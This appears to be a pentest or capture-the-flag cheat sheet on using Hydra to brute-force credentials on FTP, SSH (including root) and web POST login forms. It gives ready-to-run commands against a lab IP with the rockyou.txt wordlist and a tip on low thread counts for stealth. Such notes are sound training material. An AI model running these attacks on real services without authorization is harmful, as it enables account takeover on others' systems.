## 🔐 What is Hydra

Hydra is an online brute force password cracking tool used to attack network services and web login forms. It supports many protocols such as SSH, FTP, HTTP, HTTPS, SMB, RDP, and more.

Official reference
[https://en.kali.tools/?p=220](https://en.kali.tools/?p=220)

---

## 🧠 General Hydra Syntax

```
hydra [options] <target> <service>
```

Hydra behavior depends on the protocol you are attacking.

---

## 📁 FTP Brute Force Example

```
hydra -l user -P passlist.txt ftp://10.65.156.52
```

Explanation

- Uses username `user`
- Tries passwords from `passlist.txt`
- Targets FTP service on the given IP

---

## 🔑 SSH Brute Force

### Command

```
hydra -l <username> -P <full_path_to_password_list> <target_ip> -t 4 ssh
```

### Example

```
hydra -l root -P passwords.txt 10.65.156.52 -t 4 ssh
```

### Options Explained

| Option | Meaning                    |
| ------ | -------------------------- |
| -l     | Single username            |
| -P     | Password list              |
| -t     | Number of parallel threads |
| ssh    | Target service             |

Hydra will try each password against the SSH service using multiple threads.

---

## 🌐 Web Login Brute Force (POST Form)

Hydra can brute force web forms if you know:

- Request method GET or POST
- Form field names
- Failure response message

Use browser DevTools or Burp Suite to gather this info.

---

### General Syntax for POST Forms

```
hydra -l <username> -P <wordlist> <target_ip> http-post-form "<path>:<credentials>:<failure_string>" -V
```

---

### Example

```
hydra -l admin -P rockyou.txt 10.65.156.52 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

### Explanation

| Component       | Meaning                     |
| --------------- | --------------------------- |
| /               | Login page path             |
| username=^USER^ | Username field              |
| password=^PASS^ | Password field              |
| F=incorrect     | Failure message in response |
| -V              | Verbose output              |

Hydra replaces `^USER^` and `^PASS^` automatically.

---

## 🔍 Finding rockyou.txt

If you do not know where rockyou.txt is located:

```
find / -type f -name "rockyou.txt" 2>/dev/null
```

Common path on Kali:

```
/usr/share/wordlists/rockyou.txt
```

---

## ⚠️ Important Notes

- Hydra is noisy and easy to detect
- Many services enforce rate limiting or account lockout
- Always confirm authorization before using Hydra
- Use low thread counts when stealth matters

---

## 🧠 When to Use Hydra

- Weak password testing
- CTF challenges
- Lab environments
- Authorized penetration tests
